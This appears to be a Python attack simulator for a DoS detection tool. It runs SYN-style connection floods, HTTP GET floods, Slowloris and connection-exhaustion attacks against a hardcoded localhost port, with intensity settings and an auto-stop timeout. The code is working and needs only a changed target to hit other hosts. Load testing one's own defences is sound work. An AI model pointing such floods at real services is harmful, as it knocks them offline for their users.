"""
DoS Sentinel — Attack Simulator
Usage:
    python simulator.py --attack syn|http|slowloris|exhaust
    python simulator.py --intensity low|medium|high
    python simulator.py --timeout 60   (auto-stop after N seconds, default 120)
"""

import socket
import time
import threading
import argparse
import random

try:
    import requests as _requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

HOST = "127.0.0.1"
PORT = 8000

_active_sockets: list = []
_stop_event = threading.Event()

INTENSITY = {
    "low":    {"conns": 20,  "threads": 2,  "delay": 0.5},
    "medium": {"conns": 60,  "threads": 5,  "delay": 0.1},
    "high":   {"conns": 150, "threads": 10, "delay": 0.02},
}


def log(msg: str):
    print(f"[SIM] {msg}")


def stop_all():
    _stop_event.set()
    log(f"Closing {len(_active_sockets)} sockets...")
    for s in list(_active_sockets):
        try:
            s.close()
        except OSError:
            pass
    _active_sockets.clear()
    log("Simulator stopped.")


# ── SYN Flood ──────────────────────────────────────────────────────────────────

def syn_flood(cfg: dict, timeout: int):
    log(f"SYN Flood — {cfg['conns']} connections, {cfg['threads']} threads")
    _stop_event.clear()

    def worker():
        while not _stop_event.is_set():
            try:
                s = socket.create_connection((HOST, PORT), timeout=2)
                _active_sockets.append(s)
                time.sleep(cfg["delay"])
            except OSError:
                pass

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(cfg["threads"])]
    for t in threads:
        t.start()

    log(f"Running for {timeout}s... press Ctrl+C to stop early")
    deadline = time.time() + timeout
    try:
        while not _stop_event.is_set() and time.time() < deadline:
            log(f"Open sockets: {len(_active_sockets)}")
            time.sleep(2)
    except KeyboardInterrupt:
        pass
    finally:
        stop_all()


# ── HTTP Flood ─────────────────────────────────────────────────────────────────

def http_flood(cfg: dict, timeout: int):
    if not HAS_REQUESTS:
        log("ERROR: 'requests' package not installed. Run: pip install requests")
        return

    log(f"HTTP Flood — {cfg['threads']} threads hammering GET /")
    _stop_event.clear()
    counter = {"n": 0}

    def worker():
        while not _stop_event.is_set():
            try:
                _requests.get(f"http://{HOST}:{PORT}/", timeout=2)
                counter["n"] += 1
            except OSError:
                pass
            time.sleep(cfg["delay"])

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(cfg["threads"])]
    for t in threads:
        t.start()

    deadline = time.time() + timeout
    try:
        while not _stop_event.is_set() and time.time() < deadline:
            log(f"Requests sent: {counter['n']}")
            time.sleep(2)
    except KeyboardInterrupt:
        pass
    finally:
        stop_all()


# ── Slowloris ──────────────────────────────────────────────────────────────────

def slowloris(cfg: dict, timeout: int):
    log(f"Slowloris — opening {cfg['conns']} slow HTTP connections")
    _stop_event.clear()
    sockets: list = []

    def open_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((HOST, PORT))
            s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {HOST}\r\n".encode())
            sockets.append(s)
        except OSError:
            pass

    for _ in range(cfg["conns"]):
        open_socket()
        time.sleep(0.05)

    log(f"Holding {len(sockets)} slow connections open...")
    deadline = time.time() + timeout
    try:
        while not _stop_event.is_set() and time.time() < deadline:
            for s in list(sockets):
                try:
                    s.send(b"X-Keep: alive\r\n")
                except OSError:
                    sockets.remove(s)
                    open_socket()
            log(f"Slowloris sockets alive: {len(sockets)}")
            time.sleep(10)
    except KeyboardInterrupt:
        pass
    finally:
        for s in sockets:
            try:
                s.close()
            except OSError:
                pass
        stop_all()


# ── Connection Exhaustion ──────────────────────────────────────────────────────

def connection_exhaustion(cfg: dict, timeout: int):
    log(f"Connection Exhaustion — holding {cfg['conns']} connections open")
    _stop_event.clear()

    for _ in range(cfg["conns"]):
        try:
            s = socket.create_connection((HOST, PORT), timeout=2)
            _active_sockets.append(s)
        except OSError:
            break

    log(f"Holding {len(_active_sockets)} connections for {timeout}s...")
    deadline = time.time() + timeout
    try:
        while not _stop_event.is_set() and time.time() < deadline:
            elapsed = int(deadline - time.time())
            log(f"Open: {len(_active_sockets)} | Remaining: {elapsed}s")
            time.sleep(5)
    except KeyboardInterrupt:
        pass
    finally:
        stop_all()


# ── Entry ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DoS Sentinel Attack Simulator")
    parser.add_argument("--attack",    default="syn",    choices=["syn", "http", "slowloris", "exhaust"])
    parser.add_argument("--intensity", default="medium", choices=["low", "medium", "high"])
    parser.add_argument("--timeout",   default=120, type=int, help="Auto-stop after N seconds (default: 120)")
    args = parser.parse_args()

    cfg = INTENSITY[args.intensity]

    print()
    print("=" * 50)
    print(f"  DoS Sentinel Simulator")
    print(f"  Attack:    {args.attack.upper()}")
    print(f"  Intensity: {args.intensity.upper()}")
    print(f"  Timeout:   {args.timeout}s")
    print(f"  Target:    {HOST}:{PORT}")
    print("=" * 50)
    print()

    dispatch = {
        "syn":      syn_flood,
        "http":     http_flood,
        "slowloris": slowloris,
        "exhaust":  connection_exhaustion,
    }
    dispatch[args.attack](cfg, args.timeout)
